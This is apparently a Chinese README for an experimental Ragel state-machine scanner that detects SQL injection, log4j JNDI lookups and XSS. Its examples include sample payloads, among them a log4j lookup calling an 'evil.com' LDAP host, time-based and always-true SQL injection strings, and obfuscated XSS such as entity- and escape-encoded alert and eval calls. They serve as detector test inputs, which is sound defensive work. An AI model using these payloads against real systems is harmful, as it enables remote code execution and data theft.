# ragel-scan

用 [ragel](https://www.colm.net/open-source/ragel/) 写的一个实验：把"判断输入是不是攻击 payload"写成状态机。

工作方式：

1. **切词**：把输入切成小片段。`SELECT * FROM a` → `SELECT` `*` `FROM` `a`；`<img onerror=x>` → `<img` `onerror` `x`。
2. **套规则**：拿片段匹配规则，匹配上就是可疑。

全是状态机，快，不依赖正则。

## 能干什么

编译完在 `build/ragel/` 下有几个可执行文件，各管一类攻击：

| 可执行文件 | 管什么 | 例子 |
| --- | --- | --- |
| `sqli_scan` | SQL 注入，24 条规则 | `1=1 OR 1=2` |
| `log4j_scan` | log4j `${...}` 查找表达式 | `${jndi:ldap://evil.com/a}` |
| `html5_xss_scan` | XSS，6 条规则 | `<img onerror=alert(1)>` |

## 跑起来

需要 ragel 和 gcc（Ubuntu/Debian）：

```bash
sudo apt install ragel gcc make

make -j        # 编译，产物在 build/ragel/
make test      # 跑测试

# 或用 cmake
cmake -S . -B build && cmake --build build -j
cmake --build build --target validate_ragel
```

输出先打印切词，再打印命中规则：`sqli_scan` / `html5_xss_scan` 行首是 `!!`，`log4j_scan` 是 `[JNDI]`。`make test` 输出 `[PASS]` / `[FAIL]` 加总结。

## SQL 注入

`sqli_scan` 是语义分析，不是字符串匹配：

```bash
./build/ragel/sqli_scan '1=1'               # always_true
./build/ragel/sqli_scan '1=2'               # 结构相同，但恒假，不命中
./build/ragel/sqli_scan 'SLEEP(5)'          # sleep（大小写不敏感）
./build/ragel/sqli_scan 'sleeping(5)'       # 名字不是 sleep，不命中
./build/ragel/sqli_scan '1=1/**/OR/**/1=2'  # 注释跳过
./build/ragel/sqli_scan '(SELECT * FROM (SELECT 1))' # 嵌套子查询
```

`1=1` 和 `1=2` 结构一样，靠 `sql_const_numbers_equal` 算两边值是否相等；`sleep` 靠 `$is_sleep` 精确比对函数名，不是前缀匹配。

规则举例：

```
sleep        := IDENT $is_sleep LPAREN expr_list? RPAREN %note any*;
always_true  := constant_value EQ constant_value %note any*;
union_select := UNION ALL? SELECT expr_list? %note any*;
```

## XSS

`html5_xss_scan` 是语义分析，不是字符串匹配：

```bash
./build/ragel/html5_xss_scan '<img onerror=alert(1)>'                      # black_attr + dangerous_js
./build/ragel/html5_xss_scan '<img src=x onerror="al&#101;rt(1)">'         # &#101; 还原成 e
./build/ragel/html5_xss_scan '<script>\u0061lert(1)</script>'              # \u0061 还原成 a
./build/ragel/html5_xss_scan '<script>window["eval"]("alert(1)")</script>' # eval 藏在字符串里
```

实体、转义、字符串里的危险名先还原再比黑名单。

规则举例：

```
black_attr   := ATTR_NAME $is_battr %note any*;
black_url    := ATTR_NAME $is_url_attr_p ATTR_VALUE $is_burl %note any*;
dangerous_js := ( ATTR_VALUE | SCRIPT_TEXT ) $is_djs %note any*;
```

## 目录

```
src/            底座：切词 + 语法骨架
  sql/          SQL 切词、语法
  html5/        HTML 切词 + 实体解码
  js/           JS 切词、语法、危险调用检测
  log4j/        log4j 切词
  util/         跨模块小工具
rules/          规则：判"是不是攻击"
  html5_xss/    XSS 规则，corpus/xss.log 是样本
  sqli/         SQL 注入规则
examples/       驱动（*_scan.c）+ 测试（test_*.sh）
build/          编译产物，git 不跟踪
```

`src/` 是工具，`rules/` 是规则，调检测效果基本只改 `rules/`。

## 改规则

- 规则在 `rules/` 下对应模块的 `.rl` 里，改完 `make` 生效。
- `build/ragel/gen/*.c` 是 ragel 生成的中间产物，别手改。
- 测试在 `examples/test_*.sh`，加规则顺手加两条用例。
- 规则 include `src/` 下的共享片段，ragel 生成时加 `-I` 指向 `src/`，写在 `Makefile` / `CMakeLists.txt`。

## 几个说明

- 驱动（`examples/*.c`）只 include 头文件、链接 `libragel_sql.a`，不碰生成的 `.c`。
- 括号嵌套、子查询用 ragel 的 `fcall` / `fret`，细节在对应 `.rl` 开头注释。
- 只 `make` 不 `make test` 时，`.rl` 改了也会自动重新生成。
